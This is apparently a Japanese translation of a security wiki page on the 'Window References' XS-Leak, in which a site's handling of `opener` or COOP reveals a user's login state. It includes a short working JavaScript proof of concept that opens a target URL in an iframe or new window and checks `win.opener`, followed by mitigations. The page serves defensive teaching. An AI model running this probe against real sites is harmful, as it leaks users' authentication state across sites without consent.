+++
title = "Window References"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++

もしページが `opener` プロパティを `null` に設定したり、ユーザーの状態に応じて [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) による保護を使用している場合、その状態に関するクロスサイト情報を推測することができます。
例えば、攻撃者は認証されたユーザーのみがアクセスできる iframe (または新しいウィンドウ) でエンドポイントを開き、そのウィンドウの参照をチェックするだけで、ユーザーがログインしているかどうかを検出することができます。

## コード
以下のコードは、`open` プロパティが `null` に設定されているかどうか、あるいは [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) ヘッダーが `unsafe-none` 以外の値で存在するかどうかを検出する方法を示しています。
これは、iframeと新しいウィンドウの両方で行うことができます。

```javascript
// 脆弱な攻撃対象URL
const v_url = 'https://example.org/profile';
const exploit = (url, new_window) => {
  let win;
  if(new_window){
    // 新しいタブを開き、win.opener が COOP の影響を受けたか、あるいは null に設定されたかどうかを確認
    win = open(url);
  }else{
    // opener が定義されているかどうかを検出するために iframe を作成
    // COOP の検出や、ページがフレーム保護を実装している場合は機能しない
    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
    // iframeを脆弱な攻撃対象URLにリダイレクトする
    win = open(url, "xsleaks");
  }
  
  // ページのロードを2秒待つ
  setTimeout(() => {
    // 新しく開いたウィンドウのオープナープロパティを確認する
    if(!win.opener) console.log("win.opener is null");
    else console.log("win.opener is defined");
  }, 2000);
}
exploit(v_url);
exploit(v_url, 1);
```

## 対策

この種の XS-Leak を軽減する方法は、COOP を使って全てのページで `opener` プロパティを同じ値に設定し、異なるページ間で一貫性を保つ必要があります。
JavaScript を使って `opener` を `null` に設定すると、iframe のサンドボックス属性を使用して JavaScript を完全に無効にすることができるため、エッジケースが発生することがあります。